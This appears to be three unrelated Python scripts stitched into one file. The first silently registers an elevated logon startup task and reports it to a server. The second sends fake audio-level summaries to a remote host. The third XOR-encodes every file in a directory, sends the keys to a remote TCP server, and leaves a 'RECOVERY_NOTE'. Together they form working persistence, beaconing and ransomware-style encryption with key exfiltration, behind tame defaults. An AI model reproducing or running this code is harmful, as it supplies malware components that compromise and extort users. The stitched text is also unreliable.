import os
import subprocess
import sys
import time
import json
from datetime import datetime
from urllib.request import urlopen, Request
from urllib.error import URLError

CONFIG_FILE = 'config.json'
LOG_FILE = 'startup_task_log.txt'
MAX_RETRIES = 5
BACKOFF_FACTOR = 2

DEFAULT_TASK_NAME = "DefaultStartupTask"
DEFAULT_COMMAND = "echo Hello, World!"
DEFAULT_SILENT = True  # Default to silent mode


def load_config():
    """Load configuration from file or return defaults if file is missing."""
    config_defaults = {"hostname": "localhost", "port": 8080}
    if not os.path.exists(CONFIG_FILE):
        log_message(f"Configuration file '{CONFIG_FILE}' not found. Using default configuration.")
        return config_defaults
    try:
        with open(CONFIG_FILE, 'r') as f:
            config = json.load(f)
            if not isinstance(config, dict):
                raise ValueError("Configuration file must contain a JSON object")
            return {**config_defaults, **config}  # Merge defaults with file values
    except Exception as e:
        log_message(f"Error reading configuration file: {e}. Using default configuration.")
        return config_defaults


def log_message(message):
    """Log a message with a timestamp to the log file."""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        with open(LOG_FILE, 'a') as log_file:
            log_file.write(f"[{timestamp}] {message}\n")
    except Exception as e:
        print(f"Failed to log message: {e}", file=sys.stderr)


def report_to_server(server_url, payload):
    """Report the task status to a server with retries and exponential backoff."""
    retries = 0
    while retries < MAX_RETRIES:
        try:
            request = Request(
                server_url,
                data=json.dumps(payload).encode('utf-8'),
                headers={'Content-Type': 'application/json'}
            )
            with urlopen(request) as response:
                if response.status == 200:
                    return True
        except URLError as e:
            log_message(f"Failed to report to server (attempt {retries + 1}): {e}")
            time.sleep(BACKOFF_FACTOR ** retries)
            retries += 1
        except Exception as e:
            log_message(f"Unexpected error during server report: {e}")
            break
    return False


def create_startup_task_windows(task_name, command, silent, server_url):
    """Create a Windows startup task."""
    try:
        subprocess.run(
            [
                "schtasks", "/Create", "/SC", "ONLOGON", "/TN", task_name,
                "/TR", command, "/RL", "HIGHEST"
            ],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        success_message = f"Startup task '{task_name}' registered successfully on Windows."
        if not silent:
            print(success_message)
        log_message(success_message)
        server_payload = {"task_name": task_name, "status": "success", "platform": "Windows"}
        if not report_to_server(server_url, server_payload):
            log_message(f"Failed to report successful registration to server for task '{task_name}'.")
    except subprocess.CalledProcessError as e:
        error_message = f"Failed to register startup task on Windows: {e.stderr.decode(errors='ignore').strip()}"
        if not silent:
            print(error_message)
        log_message(error_message)
        server_payload = {"task_name": task_name, "status": "failure", "platform": "Windows", "error": error_message}
        if not report_to_server(server_url, server_payload):
            log_message(f"Failed to report failure to server for task '{task_name}'.")


def create_startup_task_posix(task_name, command, silent, server_url):
    """Create a POSIX (Linux/macOS) startup task."""
    try:
        autostart_path = os.path.expanduser(f"~/.config/autostart/{task_name}.desktop")
        os.makedirs(os.path.dirname(autostart_path), exist_ok=True)
        with open(autostart_path, 'w') as f:
            f.write(f"""[Desktop Entry]
Type=Application
Exec={command}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name={task_name}
""")
        success_message = f"Startup task '{task_name}' registered successfully on POSIX system."
        if not silent:
            print(success_message)
        log_message(success_message)
        server_payload = {"task_name": task_name, "status": "success", "platform": "POSIX"}
        if not report_to_server(server_url, server_payload):
            log_message(f"Failed to report successful registration to server for task '{task_name}'.")
    except Exception as e:
        error_message = f"Failed to register startup task on POSIX system: {e}"
        if not silent:
            print(error_message)
        log_message(error_message)
        server_payload = {"task_name": task_name, "status": "failure", "platform": "POSIX", "error": str(e)}
        if not report_to_server(server_url, server_payload):
            log_message(f"Failed to report failure to server for task '{task_name}'.")


def register_startup_task(task_name, command, silent):
    """Register a startup task based on the operating system."""
    config = load_config()
    server_url = f"http://{config['hostname']}:{config['port']}/report"

    if os.name == 'nt':  # Windows
        create_startup_task_windows(task_name, command, silent, server_url)
    elif os.name == 'posix':  # macOS/Linux
        create_startup_task_posix(task_name, command, silent, server_url)
    else:
        error_message = "Unsupported operating system. Could not register startup task."
        if not silent:
            print(error_message)
        log_message(error_message)
        server_payload = {"task_name": task_name, "status": "failure", "platform": "unknown", "error": error_message}
        if not report_to_server(server_url, server_payload):
            log_message(f"Failed to report failure to server for task '{task_name}'.")


if __name__ == '__main__':
    task_name = DEFAULT_TASK_NAME
    command = DEFAULT_COMMAND
    silent = DEFAULT_SILENT

    try:
        register_startup_task(task_name, command, silent)
    except Exception as e:
        error_message = f"Unexpected error: {e}"
        log_message(error_message)
        if not silent:
            print(error_message)
        sys.exit(1)

    log_message("Startup task registration script completed successfully.")
    sys.exit(0)

import os
import sys
import time
import json
import socket
from http.client import HTTPConnection

# Configurable options
SERVER_HOST = "example.com"  # Replace with actual server hostname
SERVER_PORT = 80            # Replace with actual server port
SERVER_ENDPOINT = "/audio-summary"
RETRY_INTERVAL = 5          # Seconds between retries if server is unreachable
AUDIO_LEVEL_FILE = "audio_level.log"
SUMMARY_FILE = "audio_summary.json"
MAX_RETRIES = 3


def log_message(message, log_file=AUDIO_LEVEL_FILE):
    """Log a message to the specified file."""
    try:
        with open(log_file, "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")
    except Exception as e:
        print(f"Failed to write log: {e}")


def check_audio_device():
    """Check if the audio device is available and monitor audio levels."""
    try:
        with open(AUDIO_LEVEL_FILE, "w") as f:
            # Check audio device availability
            if sys.platform == "win32":
                import ctypes
                waveOutGetNumDevs = ctypes.windll.winmm.waveOutGetNumDevs
                if waveOutGetNumDevs() > 0:
                    f.write("Audio device is available.\n")
                    return monitor_audio_level(f)
                else:
                    f.write("Audio device is unavailable.\n")
            elif sys.platform in ("linux", "darwin"):
                result = os.system("aplay -l > /dev/null 2>&1")
                if result == 0:
                    f.write("Audio device is available.\n")
                    return monitor_audio_level(f)
                else:
                    f.write("Audio device is unavailable.\n")
            else:
                f.write("Unsupported platform.\n")
        return None
    except Exception as e:
        log_message(f"Error checking audio device: {e}")
        return None


def monitor_audio_level(file_handle):
    """Simulate monitoring audio levels and return a summary."""
    try:
        file_handle.write("Monitoring audio levels...\n")
        levels = [level for level in range(0, 101, 10)]  # Dummy levels from 0 to 100
        for level in levels:
            file_handle.write(f"Audio level: {level}\n")
        summary = {
            "min_level": min(levels),
            "max_level": max(levels),
            "average_level": sum(levels) / len(levels),
        }
        file_handle.write(f"Summary: {json.dumps(summary)}\n")
        return summary
    except Exception as e:
        file_handle.write(f"Error monitoring audio level: {e}\n")
        return None


def send_summary_to_server(summary):
    """Send the audio level summary to a remote server with retry mechanism."""
    if not summary:
        log_message("No summary to send.")
        return

    summary_json = json.dumps(summary)
    headers = {"Content-Type": "application/json"}

    retries = 0
    while retries < MAX_RETRIES:
        try:
            connection = HTTPConnection(SERVER_HOST, SERVER_PORT, timeout=10)
            connection.request("POST", SERVER_ENDPOINT, summary_json, headers)
            response = connection.getresponse()
            if 200 <= response.status < 300:
                log_message("Summary sent successfully to server.")
                connection.close()
                return
            else:
                log_message(f"Failed to send summary to server. HTTP status: {response.status}")
            connection.close()
        except (socket.error, Exception) as e:
            log_message(f"Error connecting to server: {e}")
        retries += 1
        if retries < MAX_RETRIES:
            log_message(f"Retrying in {RETRY_INTERVAL} seconds... (Attempt {retries}/{MAX_RETRIES})")
            time.sleep(RETRY_INTERVAL)
        else:
            log_message("Max retries reached. Failed to send summary.")
            return


def run_headless():
    """Run the program without requiring user input or additional arguments."""
    log_message("Starting audio device check...")
    summary = check_audio_device()
    if summary:
        try:
            with open(SUMMARY_FILE, "w") as f:
                json.dump(summary, f)
            log_message(f"Summary saved to {SUMMARY_FILE}.")
        except Exception as e:
            log_message(f"Error saving summary to file: {e}")
        send_summary_to_server(summary)
    log_message("Program execution completed.")


if __name__ == "__main__":
    run_headless()

import os
import hashlib
import base64
import socket
import time
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def generate_key(file_name):
    """Generate a unique key derived from the file name using SHA256."""
    return hashlib.sha256(file_name.encode('utf-8')).digest()

def xor_bytes(data, key):
    """Apply XOR transformation between data and key."""
    key_len = len(key)
    return bytes(data[i] ^ key[i % key_len] for i in range(len(data)))

def encode_file(file_path, key, backup_path):
    """Encode file contents using XOR and save the encoded data."""
    try:
        with open(file_path, 'rb') as original_file:
            original_data = original_file.read()
        encoded_data = xor_bytes(original_data, key)
        with open(backup_path, 'wb') as backup_file:
            backup_file.write(encoded_data)
        logging.info(f"Encoded file '{file_path}' and saved to '{backup_path}'.")
    except Exception as e:
        logging.error(f"Error encoding file '{file_path}': {e}")

def create_recovery_note(directory, recovery_data):
    """Generate a summary file listing original file names and derived keys."""
    try:
        recovery_note_path = os.path.join(directory, 'RECOVERY_NOTE.txt')
        with open(recovery_note_path, 'w') as recovery_note:
            recovery_note.write("RECOVERY NOTE\n")
            recovery_note.write("=======================\n")
            recovery_note.write("The following files have been encoded:\n\n")
            for file_name, encoded_key in recovery_data:
                recovery_note.write(f"File: {file_name}\n")
                recovery_note.write(f"Key (Base64): {encoded_key}\n\n")
            recovery_note.write("To restore, XOR the encoded file contents with the derived key.\n")
        logging.info(f"Created recovery note at '{recovery_note_path}'.")
    except Exception as e:
        logging.error(f"Error creating recovery note: {e}")

def send_key_to_server(hostname, port, file_name, encoded_key):
    """Send the file name and encoded key to the remote server via TCP."""
    max_retries = 3
    delay = 1
    for attempt in range(max_retries):
        try:
            with socket.create_connection((hostname, port), timeout=5) as sock:
                message = f"{file_name}:{encoded_key}\n"
                sock.sendall(message.encode('utf-8'))
                logging.info(f"Successfully sent key for file '{file_name}' to server.")
                return
        except (socket.error, socket.timeout) as e:
            logging.warning(f"Attempt {attempt + 1} failed: {e}. Retrying in {delay}s...")
            time.sleep(delay)
            delay *= 2
    logging.error(f"Failed to send key for file '{file_name}' to server after {max_retries} attempts.")

def process_directory(directory, hostname, port):
    recovery_data = []
    try:
        for entry in os.listdir(directory):
            full_path = os.path.join(directory, entry)
            if os.path.isfile(full_path) and not entry.endswith('.backup') and entry != 'RECOVERY_NOTE.txt':
                key = generate_key(entry)
                encoded_key = base64.b64encode(key).decode('utf-8')
                backup_path = f"{full_path}.backup"
                encode_file(full_path, key, backup_path)
                recovery_data.append((entry, encoded_key))
                send_key_to_server(hostname, port, entry, encoded_key)
        if recovery_data:
            create_recovery_note(directory, recovery_data)
        else:
            logging.info(f"No files found in directory '{directory}' to process.")
    except FileNotFoundError:
        logging.error(f"Directory '{directory}' not found.")
    except PermissionError:
        logging.error(f"Permission denied for accessing '{directory}'.")
    except Exception as e:
        logging.error(f"Error processing directory: {e}")

def prepare_test_environment(directory_path):
    """Create a test environment with sample files if the directory doesn't exist."""
    os.makedirs(directory_path, exist_ok=True)
    sample_files = {
        "file1.txt": "This is file 1.",
        "file2.txt": "This is file 2.",
        "file3.txt": "This is file 3."
    }
    for file_name, content in sample_files.items():
        file_path = os.path.join(directory_path, file_name)
        if not os.path.exists(file_path):
            with open(file_path, 'w') as f:
                f.write(content)

def main():
    # Default configuration
    directory_path = "./test_directory"
    server_hostname = "localhost"
    server_port = 8080

    # Prepare the test environment
    prepare_test_environment(directory_path)

    # Process the directory
    process_directory(directory_path, server_hostname, server_port)

if __name__ == "__main__":
    main()

import sys
